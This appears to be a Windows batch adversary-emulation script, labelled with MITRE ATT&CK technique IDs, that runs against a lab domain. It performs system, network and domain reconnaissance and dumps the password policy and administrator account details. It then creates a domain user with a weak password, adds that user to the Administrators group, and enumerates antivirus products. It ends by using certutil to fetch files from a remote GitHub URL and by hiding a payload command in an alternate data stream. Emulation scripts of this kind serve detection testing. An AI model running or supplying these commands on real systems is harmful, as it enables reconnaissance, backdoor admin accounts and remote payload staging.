@ECHO OFF

echo 
powershell write-host -back DarkRed [*] machine/user information
echo
ver
hostname
whoami

echo  
echo  

:: Mitre:T108
powershell write-host -back DarkRed [W] Dumping system information [any key to continue]
pause > null
echo [*] system details  
systeminfo | findstr /c:"OS Name"
systeminfo | findstr /c:"OS Version"
systeminfo | findstr /c:"System Type"
systeminfo | findstr /c:"Domain"
echo
ipconfig /all
arp -a
echo  
echo  
:: Mitre T1018, T1135, T1482
:: Enumeration of the trust relationship between the workstation and the domain
powershell write-host -back DarkRed [W] Dumping domain information [any key to continue]
pause > null
echo [*] domain enumeration
nltest /sc_query:lab
echo  

nltest /dclist:lab
echo  

nltest /dcname:lab
echo  

nltest /sc_reset:lab

echo  
echo  

:: Mitre:T1201
:: Indicates whether there is evidence of the process trying to perform password policy discovery
powershell write-host -back DarkRed [W] Dumping password policy and some users information [any key to continue]
pause > null
echo [*] dumping password policy 
net accounts

echo [*] checking localgroup 
net localgroup

echo [*] dumping Administrator account info 
net user Administrator

echo [*] dumping admin account info 
net user admin
echo  
echo  

echo [*] creating a domain user  
net user user1 admin123 /add /domain
echo  
echo [*] adding user to Administrators group
net localgroup Administrators user1 /add

echo  

:: wmic 
:: collect a list of users and groups in the local system :
powershell write-host -back DarkRed [W] Account and system details using wmic [any key to continue]
pause > null
echo [*] user and group details
wmic group list brief
wmic useraccount list brief
wmic sysaccount list brief

echo [*] Ativirus details
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe

echo [*] Patch details
:: Patch Management
:: QFE here stands for “Quick Fix Engineering”. 
wmic qfe list brief





:: Mitre:T1105
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/hli.script hli.script

:: Mitre:T1096
:: Add content to ADS [Alternate Data Streams]
:: Mitre:T1105
:: Remote File Copy : certutil.exe suspicious file download
::cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/jozems/sec/master/exec.bat ^scrobj.dll > usualfile.txt:payload.bat
cmd.exe /c echo certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/exec.bat exec.bat > usualfile.txt:payload.bat

::exec it
::cmd.exe - < usualfile.txt:payload.bat



